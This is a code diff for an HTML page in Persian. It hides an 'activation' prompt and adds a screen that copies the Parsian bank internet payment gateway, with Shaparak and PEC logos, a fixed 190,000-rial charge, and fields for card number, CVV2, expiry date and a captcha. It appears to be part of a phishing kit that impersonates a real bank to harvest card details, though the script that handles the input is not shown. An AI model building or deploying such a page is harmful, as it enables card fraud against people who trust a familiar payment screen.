@@ -16,7 +16,7 @@
     <!-- page 1 -->
     <div
       id="page1"
-      class="bg-black/90 flex items-center flex-col justify-center h-[100dvh]"
+      class="bg-black/90 flex hidden items-center flex-col justify-center h-[100dvh]"
     >
       <h1 class="text-white">
         برای فعال سازی اطلاعات خواسته شده را وارد نمایید.
@@ -90,6 +90,97 @@
       </div>
     </div>
     <!-- end page 2 -->
+    <!-- page 3 -->
+    <div id="page3" class="bg-[#F6F6F6] p-2 flex flex-col h-[100dvh]">
+      <div class="flex flex-col bg-white p-1 rounded-lg">
+        <span class="text-[#776363] text-sm text-center"
+          >پرداخت اینترنتی تجارت الکترونیک پارسیان
+        </span>
+        <div class="flex items-center justify-between mt-3 px-2">
+          <img src="./src/images/shaparak-logo.png" class="w-20" alt="" />
+          <img src="./src/images/pec-logo.png" class="w-20" alt="" />
+        </div>
+      </div>
+      <div
+        class="bg-[#0784F1] p-2 text-center mt-3 text-white text-lg rounded-xl"
+      >
+        پرداخت اینترنتی پارسیان
+      </div>
+      <div class="mt-5 bg-[#FFFFFF] p-3 rounded-2xl">
+        <!-- مبلغ پرداختی -->
+        <div
+          class="bg-[#15bb09] relative overflow-hidden rounded-xl text-white p-3 flex flex-col gap-3 mb-5"
+        >
+          <span class="text-xl">مبلغ قابل پرداخت</span>
+          <div class="flex items-center justify-between z-10">
+            <span class="text-4xl">190,000</span>
+            <span class="text-sm">ریال</span>
+          </div>
+          <div class="priceDiv"></div>
+        </div>
+        <div class="relative">
+          <input
+            type="number"
+            id="cardInput"
+            class="w-full outline-none border-2 pt-2 text-sm text-center border-gray-200 rounded-lg p-1"
+          />
+          <span class="text-[10px] absolute -top-1 right-2 px-1 py-0 bg-white">
+            شماره کارت
+          </span>
+        </div>
+        <div class="relative mt-4">
+          <input
+            type="number"
+            id="cvv2Input"
+            class="w-full outline-none border-2 pt-2 text-sm text-center border-gray-200 rounded-lg p-1"
+          />
+          <span class="text-[10px] absolute -top-1 right-2 px-1 py-0 bg-white"
+            >cvv2
+          </span>
+        </div>
+        <div class="relative mt-4">
+          <input
+            type="number"
+            id="exprationInput"
+            placeholder="ماه        /        سال"
+            class="w-full outline-none border-2 pt-2 text-sm text-center border-gray-200 rounded-lg p-1"
+          />
+          <span class="text-[10px] absolute -top-1 right-2 px-1 py-0 bg-white"
+            >تاریخ انقضاء
+          </span>
+        </div>
+        <div class="relative mt-4">
+          <input
+            type="number"
+            id="captchaInput"
+            class="w-full outline-none border-2 pt-2 text-sm text-center border-gray-200 rounded-lg p-1"
+          />
+          <img
+            src="./src/images/captcha.png"
+            class="w-24 absolute top-[50%] translate-y-[-50%] left-2"
+            alt=""
+          />
+          <span class="text-[10px] absolute -top-1 right-2 px-1 py-0 bg-white"
+            >کد امنیتی
+          </span>
+        </div>
+        <button
+          class="bg-[#15bb09] hover:bg-[#218838] transition-all duration-300 flex items-center justify-center w-[95%] mx-auto mt-5 text-white text-center rounded-lg p-2"
+        >
+          پرداخت 190,000 ریال
+        </button>
+        <button
+          class="bg-[#dc3545] hover:bg-[#c82333] transition-all duration-300 flex items-center justify-center w-[95%] mx-auto mt-3 text-white text-center rounded-lg p-2"
+        >
+          انصراف
+        </button>
+      </div>
+    </div>
+    <!-- end page 3 -->
+    <!-- شماره کارت و تاریخ انقضاء را در درگاههای بانک پارسیان ذخیره کن -->
+
+    <!-- #15bb09 #218838 -->
+    <!-- #dc3545 #c82333 -->
     <script src="./src/js/index.js"></script>
     <script
       type="text/javascript"
